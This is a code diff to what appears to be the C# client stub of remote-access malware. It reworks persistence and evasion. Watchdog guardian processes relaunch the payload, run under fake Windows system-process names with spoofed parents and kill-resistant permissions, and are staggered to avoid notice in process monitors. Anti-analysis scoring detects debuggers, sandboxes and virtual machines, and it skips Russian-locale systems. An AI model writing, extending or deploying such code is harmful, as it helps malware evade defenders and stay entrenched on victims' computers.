@@ -31,6 +31,9 @@ internal static partial class Protection
     [return: MarshalAs(UnmanagedType.Bool)]
     private static partial bool GetCursorPos(out POINT lpPoint);
 
+    [LibraryImport("user32.dll")]
+    private static partial int GetSystemMetrics(int nIndex);
+
     [StructLayout(LayoutKind.Sequential)]
     private struct POINT { public int X; public int Y; }
 
@@ -309,21 +312,25 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
     private static volatile int _guardianPid3 = -1;
     private static volatile int _guardianPid4 = -1;
 
-    // Mutex name used to arbitrate relaunch when guardians detect death simultaneously
-    private static string RelaunchMutexName => "SERO_RL_" + Config.PersistName;
+    private static string StopFlagPath => Path.Combine(
+        Path.GetTempPath(), "SERO_STOP_" + Config.PersistName + ".flag");
+
+    public static void ClearStopFlag()
+    {
+        try { if (File.Exists(StopFlagPath)) File.Delete(StopFlagPath); } catch { }
+    }
 
     public static void StopGuardian()
     {
         _guardianRunning = false;
 
-        // Wait for the GuardianLoop thread to finish its current iteration.
-        // The loop sleeps 500ms between checks — 650ms ensures it has seen
-        // _guardianRunning=false and will no longer call SpawnGuardianIfDead.
+        // Write a flag file BEFORE killing guardians. Unlike a named kernel object,
+        // a file persists after this process dies, so guardians that wake up later
+        // will still see the signal and not relaunch.
+        try { File.WriteAllText(StopFlagPath, Environment.ProcessId.ToString()); } catch { }
+
         Thread.Sleep(650);
 
-        // Kill all guardian processes and wait for them to actually die.
-        // p.Kill() is async — without WaitForExit() a guardian can still see
-        // the main process exit and relaunch the stub before it dies itself.
         var toWait = new List<Process>();
         foreach (int pid in new[] { _guardianPid1, _guardianPid2, _guardianPid3, _guardianPid4 })
         {
@@ -336,7 +343,6 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
             }
             catch { }
         }
-        // Wait up to 2s total for all guardians to exit
         foreach (var p in toWait)
         {
             try { p.WaitForExit(2000); } catch { }
@@ -382,14 +388,14 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
                     continue;
                 }
 
-                // 4 independent guardians in different process hosts — staggered so they
-                // don't all initialize at the same moment, making simultaneous kill impossible.
+                        // Staggered spawn: each guardian starts with a delay to avoid all 4 appearing
+                // simultaneously in process monitors (would look suspicious as a group).
                 int p1 = _guardianPid1; SpawnGuardianIfDead(ref p1, selfPid, exePath, 1); _guardianPid1 = p1;
-                Thread.Sleep(150);
+                Thread.Sleep(800);
                 int p2 = _guardianPid2; SpawnGuardianIfDead(ref p2, selfPid, exePath, 2); _guardianPid2 = p2;
-                Thread.Sleep(150);
+                Thread.Sleep(800);
                 int p3 = _guardianPid3; SpawnGuardianIfDead(ref p3, selfPid, exePath, 3); _guardianPid3 = p3;
-                Thread.Sleep(150);
+                Thread.Sleep(800);
                 int p4 = _guardianPid4; SpawnGuardianIfDead(ref p4, selfPid, exePath, 4); _guardianPid4 = p4;
             }
             catch (Exception ex)
@@ -411,14 +417,14 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "SearchProtocolHost.exe"),
     ];
 
-    // SingleFile disguise: guardians run as copies of the stub with system-sounding names,
-    // stored in a hidden dir. Each slot gets a unique name so they don't appear as a group.
+    // Guardian disguise names — intentionally NOT dllhost/RuntimeBroker to avoid appearing
+    // alongside common payload targets when searched in Process Hacker.
     private static readonly string[] _singleFileGuardianNames =
     [
-        "RuntimeBroker.exe",
         "SearchProtocolHost.exe",
-        "svchost.exe",
-        "dllhost.exe",
+        "SearchFilterHost.exe",
+        "taskhostw.exe",
+        "sihost.exe",
     ];
 
     private static readonly string _guardianDisguiseDir = Path.Combine(
@@ -489,30 +495,21 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
 
         int newPid = -1;
 
-        // When using NativeAOT (EnableHollowing), inject the guardian into a legitimate process
-        // so it appears as dllhost.exe (COM surrogate) instead of our exe name.
-        // PPID-spoofed to Explorer → not in our process tree → "End Process Tree" on us won't kill it.
-        if (Config.EnableHollowing)
-            newPid = SpawnHollowedGuardian(exePath, _guardianTargets[(slot - 1) % _guardianTargets.Length], selfPid);
+        // Guardians always use SpawnDetached (never Hollow) so that SERO_GUARDIAN is
+        // reliably passed via explicit env dict. Hollowing guardians caused a race condition
+        // where SERO_GUARDIAN was cleared from the parent env before the child inherited it,
+        // causing guardians to connect to the server as normal clients.
+        // The disguised process name + PPID spoof is sufficient stealth.
+        var disguisedPath = PrepareGuardianCopy(slot, exePath) ?? exePath;
 
-        // Fallback (SingleFile or hollow failed): spawn from a disguised copy with a
-        // system-sounding name (RuntimeBroker.exe, svchost.exe…) so guardians don't
-        // all appear under the same process name. PPID-spoofed to Explorer.
-        if (newPid <= 0)
+        newPid = ProcessHollowing.SpawnDetached(disguisedPath, new Dictionary<string, string?>
         {
-            // Use disguised copy path for the launch; env carries the real exePath so
-            // the guardian can relaunch main from the correct installed location.
-            var disguisedPath = PrepareGuardianCopy(slot, exePath) ?? exePath;
-
-            newPid = ProcessHollowing.SpawnDetached(disguisedPath, new Dictionary<string, string?>
-            {
-                ["SERO_GUARDIAN"]         = selfPid.ToString(),
-                ["SERO_MAIN_PID"]         = selfPid.ToString(),
-                [ProcessHollowing.HOLLOW_ENV_KEY] = null,
-                ["SERO_EXE"]              = exePath,   // real installed path for relaunch
-                ["SERO_GUARDIAN_SELF"]    = disguisedPath, // own path for self-restore
-            });
-        }
+            ["SERO_GUARDIAN"]                   = selfPid.ToString(),
+            ["SERO_MAIN_PID"]                   = selfPid.ToString(),
+            [ProcessHollowing.HOLLOW_ENV_KEY]    = null,
+            ["SERO_EXE"]                         = exePath,
+            ["SERO_GUARDIAN_SELF"]               = disguisedPath,
+        });
 
         pidField = newPid;
         if (newPid > 0)
@@ -554,6 +551,13 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
 
         // We are a guardian -- monitor the parent
         StubLog.Info($"[Guardian] Monitoring parent PID={parentPid}");
+
+        // In SingleFile mode, guardian copies are plain .NET executables — protect
+        // this process with DACL so it can't be killed by TerminateProcess().
+        // In RunPE mode the guardian is already inside a legitimate system process
+        // so applying DACL here is harmless (same protection, different host).
+        if (Config.EnableWatchdog)
+            ProtectProcessDacl();
 
         // Clear SERO_GUARDIAN from our own environment so that when we
         // relaunch the main process, it does NOT inherit this variable and
@@ -632,6 +636,17 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
 
     private static void RelaunchMain()
     {
+        // Check flag file — if present, main exited intentionally (uninstall/update).
+        try
+        {
+            if (File.Exists(StopFlagPath))
+            {
+                StubLog.Info("[Guardian] Stop flag present, NOT relaunching.");
+                return;
+            }
+        }
+        catch { }
+
         // If main is still alive (e.g. this guardian was killed independently),
         // don't relaunch — GuardianLoop in the main process will respawn us.
         var mainPidStr = Environment.GetEnvironmentVariable("SERO_MAIN_PID");
@@ -737,25 +752,36 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
     }
     // â"€â"€ Anti-Detect (sandbox/analysis) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
 
-    private static readonly string[] BlacklistedProcesses = [
+    // High-confidence: actual debuggers/reversing tools — 3 points each
+    private static readonly string[] DebuggerProcesses = [
         "ollydbg", "x64dbg", "x32dbg", "ida", "ida64", "idaq", "idaq64",
-        "windbg", "dnspy", "dotpeek", "processhacker", "procmon", "procexp",
+        "windbg", "dnspy", "dotpeek", "pestudio", "die", "lordpe", "pe-bear",
+        "resourcehacker"
+    ];
+
+    // Medium-confidence: monitoring/network tools — 1 point each
+    private static readonly string[] MonitoringProcesses = [
+        "processhacker", "procmon", "procexp",
         "wireshark", "fiddler", "charles", "tcpview",
-        "pestudio", "die", "lordpe", "pe-bear",
         "sandboxie", "cuckoo", "regmon", "filemon",
-        "autoruns", "tcpdump", "dumpcap",
-        "httpdebugger", "resourcehacker"
+        "autoruns", "tcpdump", "dumpcap", "httpdebugger"
     ];
 
     private static readonly string[] SuspiciousUsers = [
-        "sandbox", "virus", "malware", "sample", "john",
+        "sandbox", "virus", "malware", "sample",
         "currentuser", "analyst", "tequilaboomboom",
-        "sand box", "maltest", "timmy", "emily", "plmsqjvtest"
+        "sand box", "maltest", "plmsqjvtest",
+        "bruno", "fred", "maria", "janusz",
     ];
+
+    // ISO 3166-1 alpha-2 codes of blacklisted regions
+    private static readonly string[] BlacklistedCountries = ["RU"];
 
     public static bool IsAnalysisEnvironment()
     {
-        // Blacklisted processes
+        int score = 0;
+
+        // Check running processes with weighted scoring
         try
         {
             foreach (var p in Process.GetProcesses())
@@ -763,9 +789,23 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
                 try
                 {
                     var name = p.ProcessName.ToLowerInvariant();
-                    foreach (var b in BlacklistedProcesses)
+                    foreach (var b in DebuggerProcesses)
                     {
-                        if (name.Contains(b)) return true;
+                        if (name.Contains(b))
+                        {
+                            score += 3;
+                            StubLog.Info($"[AntiDetect] Debugger detected: {name} (+3, total={score})");
+                            break;
+                        }
+                    }
+                    foreach (var b in MonitoringProcesses)
+                    {
+                        if (name.Contains(b))
+                        {
+                            score += 1;
+                            StubLog.Info($"[AntiDetect] Monitor detected: {name} (+1, total={score})");
+                            break;
+                        }
                     }
                 }
                 catch { }
@@ -774,40 +814,109 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
         }
         catch { }
 
-        // Suspicious username
+        // Suspicious username — 2 points
         var user = Environment.UserName.ToLowerInvariant();
         foreach (var u in SuspiciousUsers)
         {
-            if (user.Contains(u)) return true;
+            if (user.Contains(u))
+            {
+                score += 2;
+                StubLog.Info($"[AntiDetect] Suspicious user: {user} (+2, total={score})");
+                break;
+            }
         }
 
-        return false;
+        // Blacklisted region — read from registry (works with InvariantGlobalization=true)
+        try
+        {
+            // HKCU\Control Panel\International → LocaleName = "ru-RU", "en-US", etc.
+            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Control Panel\International");
+            var locale = key?.GetValue("LocaleName")?.ToString() ?? "";
+            // Extract country code: "ru-RU" → "RU"
+            var dash = locale.IndexOf('-');
+            var code = (dash >= 0 ? locale[(dash + 1)..] : locale).ToUpperInvariant();
+            foreach (var c in BlacklistedCountries)
+            {
+                if (code == c)
+                {
+                    score += 3;
+                    StubLog.Info($"[AntiDetect] Blacklisted region: {code} (+3, total={score})");
+                    break;
+                }
+            }
+        }
+        catch { }
+
+        // Generic/broadcast CPU name — VMs that don't pass real CPU info
+        try
+        {
+            using var cpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
+                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
+            if (cpuKey != null)
+            {
+                var cpu = cpuKey.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "";
+                if (cpu.Equals("Intel Processor", StringComparison.OrdinalIgnoreCase)
+                    || cpu.StartsWith("Intel(R) Processor", StringComparison.OrdinalIgnoreCase)
+                    || cpu.Length == 0)
+                {
+                    score += 3;
+                    StubLog.Info($"[AntiDetect] Generic CPU: '{cpu}' (+3, total={score})");
+                }
+            }
+        }
+        catch { }
+
+        if (score >= 3)
+            StubLog.Info($"[AntiDetect] BLOCKED — score={score} (threshold=3)");
+
+        return score >= 3;
     }
 
     // â"€â"€ Anti-Sandbox (VirusTotal / Triage / Any.Run) â"€
 
     public static bool IsSandbox()
     {
-        // Use a scoring system: need at least 3 indicators to flag as sandbox
         int score = 0;
 
-        // Uptime check: sandboxes restart VMs frequently
-        if (Environment.TickCount64 < 3 * 60 * 1000) score++; // < 3 minutes
+        // Uptime check
+        if (Environment.TickCount64 < 3 * 60 * 1000) score++;
 
-        // Sleep-skip detection: sandbox fast-forwards sleeps
-        var sw = Stopwatch.StartNew();
-        Thread.Sleep(500);
-        sw.Stop();
-        if (sw.ElapsedMilliseconds < 400) score += 2; // strong indicator
+        // Multi-stage sleep verification — each stage must not be fast-forwarded
+        // Forces the sandbox to either spend 1.2s or reveal itself on first skip
+        for (int stage = 0; stage < 3; stage++)
+        {
+            int ms = 300 + stage * 100; // 300, 400, 500ms
+            var sw = Stopwatch.StartNew();
+            Thread.Sleep(ms);
+            sw.Stop();
+            if (sw.ElapsedMilliseconds < ms * 0.8)
+            {
+                score += 2;
+                StubLog.Info($"[AntiSandbox] Sleep-skip stage {stage}: {sw.ElapsedMilliseconds}ms (+2)");
+                break;
+            }
+        }
 
-        // Temp files count: real machines have many temp files
+        // CPU compute check — emulators fast-forward Sleep but can't hide CPU execution cost
         try
         {
-            var tempDir = Path.GetTempPath();
-            if (Directory.Exists(tempDir))
+            long t0 = Environment.TickCount64;
+            long acc = unchecked((long)0x9e3779b97f4a7c15L);
+            for (long i = 0; i < 50_000_000L; i++)
+                acc = unchecked(acc * 6364136223846793005L + 1442695040888963407L ^ (acc >> 33));
+            GC.KeepAlive(acc);
+            if (Environment.TickCount64 - t0 < 50)
             {
-                if (Directory.GetFiles(tempDir).Length < 3) score++;
+                score++;
+                StubLog.Info("[AntiSandbox] CPU compute too fast (+1)");
             }
+        }
+        catch { }
+
+        // Temp files count
+        try
+        {
+            if (Directory.GetFiles(Path.GetTempPath()).Length < 3) score++;
         }
         catch { }
 
@@ -816,21 +925,37 @@ Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object {{$
         {
             using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                 @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
-            if (key != null)
+            if (key != null && key.GetSubKeyNames().Length < 8) score++;
+        }
+        catch { }
+
+        // RAM check
+        try
+        {
+            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
+            if (GlobalMemoryStatusEx(ref memStatus) && memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024)
+                score++;
+        }
+        catch { }
+
+        // Screen resolution — headless/minimal sandbox displays
+        try
+        {
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            if (w < 1024 || h < 600)
             {
-                if (key.GetSubKeyNames().Length < 8) score++;
+                score++;
+                StubLog.Info($"[AntiSandbox] Low resolution: {w}x{h} (+1)");
             }
         }
         catch { }
 
-        // RAM check: sandboxes typically have very little RAM
+        // Recent files — sandboxes have pristine user profiles
         try
         {
-            var memStatus = new MEMORYSTATUSEX { dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>() };
-            if (GlobalMemoryStatusEx(ref memStatus))
-            {
-                if (memStatus.ullTotalPhys < 1UL * 1024 * 1024 * 1024) score++; // < 1 GB
-            }
+            var recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
+            if (Directory.Exists(recent) && Directory.GetFiles(recent, "*.lnk").Length < 5)
+                score++;
         }
         catch { }
 
